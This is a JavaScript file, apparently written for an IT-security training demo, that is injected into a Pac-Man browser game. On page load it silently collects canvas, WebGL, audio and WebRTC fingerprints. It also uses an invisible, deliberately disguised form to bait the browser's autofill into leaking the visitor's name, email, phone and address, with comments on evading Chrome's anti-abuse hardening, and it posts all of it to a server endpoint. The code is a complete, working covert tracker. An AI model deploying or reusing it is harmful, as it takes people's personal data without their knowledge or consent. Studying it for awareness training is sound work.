// Client-side visitor-fingerprint capture for the IT-security training
// demo (docs/57-pacman-visitor-tracking.md). NOT part of the vendored
// pacman-canvas game — added by us, injected server-side into index.htm
// by main.go's serveIndexWithFingerprint() (keeps the vendored file
// untouched for easier future re-vendoring).
//
// Everything here reads browser APIs a page can access without any
// permission prompt (Geolocation/camera/mic APIs are deliberately NOT
// used — those show a visible browser prompt, which would defeat the
// "nobody notices" point of the demo) — plus one deliberately more
// invasive technique (harvestAutofill) that baits the browser's saved
// autofill profile into leaking real name/email/phone into invisible
// form fields. Scoped strictly to the training context described in
// docs/57 — disclosed verbally to participants, then shown live via the
// Grafana dashboard as the reveal.
(function () {
  "use strict";

  // FNV-1a 32-bit — fast, synchronous, no WebCrypto round-trip needed.
  // Not cryptographic; only needs to differ between distinguishable
  // inputs, which is all a fingerprint requires.
  function hashString(str) {
    var hash = 2166136261;
    for (var i = 0; i < str.length; i++) {
      hash ^= str.charCodeAt(i);
      hash = Math.imul(hash, 16777619);
    }
    return (hash >>> 0).toString(16);
  }

  function getCanvasFingerprint() {
    try {
      var canvas = document.createElement("canvas");
      var ctx = canvas.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.fillText("pacman-fingerprint", 2, 15);
      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
      ctx.fillText("pacman-fingerprint", 4, 17);
      return hashString(canvas.toDataURL());
    } catch (e) {
      return null;
    }
  }

  function getWebGLInfo() {
    try {
      var canvas = document.createElement("canvas");
      var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return { vendor: null, renderer: null };
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (!dbg) return { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
      return {
        vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
      };
    } catch (e) {
      return { vendor: null, renderer: null };
    }
  }

  function getAudioFingerprint(callback) {
    try {
      var AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AudioCtx) return callback(null);
      var ctx = new AudioCtx(1, 5000, 44100);
      var oscillator = ctx.createOscillator();
      oscillator.type = "triangle";
      oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
      var compressor = ctx.createDynamicsCompressor();
      oscillator.connect(compressor);
      compressor.connect(ctx.destination);
      oscillator.start(0);
      ctx.startRendering();
      var done = false;
      ctx.oncomplete = function (e) {
        if (done) return;
        done = true;
        var output = e.renderedBuffer.getChannelData(0);
        var sum = 0;
        for (var i = 4500; i < 5000; i++) sum += Math.abs(output[i]);
        callback(sum.toString());
      };
      setTimeout(function () {
        if (!done) {
          done = true;
          callback(null);
        }
      }, 1000);
    } catch (e) {
      callback(null);
    }
  }

  function getWebRTCLocalIP(callback) {
    try {
      var RTCPeerConnection =
        window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
      if (!RTCPeerConnection) return callback(null);
      var pc = new RTCPeerConnection({ iceServers: [] });
      var ips = [];
      var done = false;
      var finish = function () {
        if (done) return;
        done = true;
        try {
          pc.close();
        } catch (e) {}
        callback(ips.length ? ips : null);
      };
      pc.createDataChannel("");
      pc.createOffer().then(function (offer) {
        return pc.setLocalDescription(offer);
      }).catch(finish);
      pc.onicecandidate = function (event) {
        if (!event || !event.candidate) {
          finish();
          return;
        }
        var match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(
          event.candidate.candidate
        );
        if (match && ips.indexOf(match[1]) === -1) ips.push(match[1]);
      };
      setTimeout(finish, 1000);
    } catch (e) {
      callback(null);
    }
  }

  // Invisible (off-screen, not display:none — some browsers skip autofill
  // on display:none/visibility:hidden fields) form baited with common
  // autocomplete tokens. If the visitor's browser has a saved autofill
  // profile, it fills these fields on its own — no typing, no visible
  // form. This is the one technique here that can produce real personal
  // data (name/email/phone) rather than just device characteristics.
  function harvestAutofill(callback) {
    try {
      var form = document.createElement("form");
      // Chrome (and other modern browsers) specifically hardened against
      // the old "left:-9999px" trick — an offscreen field with zero
      // effective viewport overlap is treated as not-visible and skipped
      // by the autofill heuristic. Kept in-viewport instead: zero opacity
      // + non-zero size + stacked behind the page content (negative
      // z-index, pointer-events:none so it can't intercept real clicks).
      // A submit button is included (never clicked) purely because
      // Chrome's form classifier weighs "looks like a real form" more
      // heavily when one is present. None of this is guaranteed to work
      // against a given browser/version — autofill anti-abuse heuristics
      // change over time and are not publicly documented in detail; this
      // is a best-effort demo, not a guaranteed exploit.
      form.setAttribute(
        "style",
        "position:fixed; top:0; left:0; width:1px; height:1px; opacity:0; z-index:-1; pointer-events:none;"
      );
      form.setAttribute("autocomplete", "on");

      var fields = [
        { name: "name", autocomplete: "name", type: "text" },
        { name: "email", autocomplete: "email", type: "email" },
        { name: "tel", autocomplete: "tel", type: "tel" },
        { name: "address", autocomplete: "street-address", type: "text" },
        { name: "postal", autocomplete: "postal-code", type: "text" },
      ];
      var inputs = {};
      fields.forEach(function (f) {
        var input = document.createElement("input");
        input.type = f.type;
        input.name = f.name;
        input.setAttribute("autocomplete", f.autocomplete);
        form.appendChild(input);
        inputs[f.name] = input;
      });
      var submit = document.createElement("input");
      submit.type = "submit";
      submit.tabIndex = -1;
      form.appendChild(submit);
      document.body.appendChild(form);

      // Best-effort nudge: some browsers only actually populate .value
      // once a field in the form has received focus, even if the
      // autofill preview was already computed on page load.
      try {
        inputs.name.focus();
        inputs.name.blur();
      } catch (e) {}

      setTimeout(function () {
        var harvested = {};
        Object.keys(inputs).forEach(function (key) {
          if (inputs[key].value) harvested[key] = inputs[key].value;
        });
        document.body.removeChild(form);
        callback(Object.keys(harvested).length ? harvested : null);
      }, 2000);
    } catch (e) {
      callback(null);
    }
  }

  function collectAndSend() {
    var data = {
      timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone) || null,
      screen_width: screen.width,
      screen_height: screen.height,
      color_depth: screen.colorDepth,
      pixel_ratio: window.devicePixelRatio || null,
      hardware_concurrency: navigator.hardwareConcurrency || null,
      device_memory: navigator.deviceMemory || null,
      languages: navigator.languages ? navigator.languages.join(",") : null,
      platform: navigator.platform || null,
      touch_points: navigator.maxTouchPoints || 0,
      connection_type: (navigator.connection && navigator.connection.effectiveType) || null,
      canvas_fp: getCanvasFingerprint(),
    };
    var webgl = getWebGLInfo();
    data.webgl_vendor = webgl.vendor;
    data.webgl_renderer = webgl.renderer;

    getAudioFingerprint(function (audioFp) {
      data.audio_fp = audioFp;
      getWebRTCLocalIP(function (localIps) {
        data.webrtc_local_ip = localIps ? localIps.join(",") : null;
        harvestAutofill(function (autofill) {
          if (autofill) {
            data.autofill_name = autofill.name || null;
            data.autofill_email = autofill.email || null;
            data.autofill_tel = autofill.tel || null;
            data.autofill_address = autofill.address || null;
            data.autofill_postal = autofill.postal || null;
          }
          fetch("/api/fingerprint", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
          }).catch(function () {});
        });
      });
    });
  }

  if (document.readyState === "complete") {
    collectAndSend();
  } else {
    window.addEventListener("load", collectAndSend);
  }
})();
